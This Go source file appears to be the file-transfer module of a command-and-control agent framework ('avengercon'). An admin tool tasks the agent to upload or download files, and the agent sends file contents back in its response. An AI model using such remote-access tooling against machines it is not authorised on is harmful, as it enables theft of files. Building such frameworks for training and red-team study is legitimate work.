package file

import (
	"errors"

	"github.com/1stl0ve/avengercon/pkg/api"
	"github.com/1stl0ve/avengercon/pkg/module"
)

// Agent is a module.Agent implementation that allows a user of the
// admin tool to send a command for the Agent to upload or download a file.
type Agent struct {
	Config config
}

// Do either reads and saves the contents of a file or writes to a file if the
// operation is download or upload, respectively.
func (m *Agent) Do(task *api.Task) error {
	if err := module.DecodeConfig(task.Data, &m.Config); err != nil {
		return err
	}

	switch m.Config.Operation {
	case upload:
		if err := m.upload(); err != nil {
			return err
		}
	case download:
		if err := m.download(); err != nil {
			return err
		}
	default:
		return errors.New("invalid operation")
	}
	return nil
}

// CreateResponse creates a task response with the appropriate status.
func (m *Agent) CreateResponse(id string) (*api.Response, error) {
	resp := &api.Response{
		AgentID: id,
		Status:  api.Status_OK,
	}

	if m.Config.Operation == download {
		resp.Data = m.Config.Content
	}
	return resp, nil
}
